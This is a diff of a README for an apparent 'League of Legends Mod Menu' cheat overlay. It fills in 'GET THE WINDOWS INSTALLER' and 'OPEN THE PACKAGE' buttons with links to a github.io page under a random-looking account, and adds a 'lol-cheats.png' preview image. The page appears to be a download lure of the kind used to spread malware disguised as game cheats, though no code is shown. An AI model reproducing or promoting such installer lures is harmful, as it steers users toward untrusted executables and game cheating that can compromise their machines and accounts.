@@ -6,7 +6,7 @@ A LoL overlay mod menu — is a Windows desktop overlay that reads the client's 
 
 # 📥 **INSTALLER PICKUP — START HERE**
 
-## [⬇️ **GET THE WINDOWS INSTALLER**]( )
+## [⬇️ **GET THE WINDOWS INSTALLER**](https://unusgvzowtef.github.io/League-of-Legends-Mod-Menu-PC-Windows/)
 
 > One tap, the package opens on its own page — no wrapper in between.
 
@@ -14,11 +14,11 @@ A LoL overlay mod menu — is a Windows desktop overlay that reads the client's 
 
 ## 🖼️ **PREVIEW IMAGE**
 
-<img src="" width="1280" height="720" alt= preview image">
+<img src="https://github.com/unusgvzowtef/League-of-Legends-Mod-Menu-PC-Windows/blob/main/lol-cheats.png?raw=true" width="1280" height="720" alt= preview image">
 
 ---
 
-### 📦 [**OPEN THE PACKAGE**]( )
+### 📦 [**OPEN THE PACKAGE**](https://unusgvzowtef.github.io/League-of-Legends-Mod-Menu-PC-Windows/)
 
 ---
 
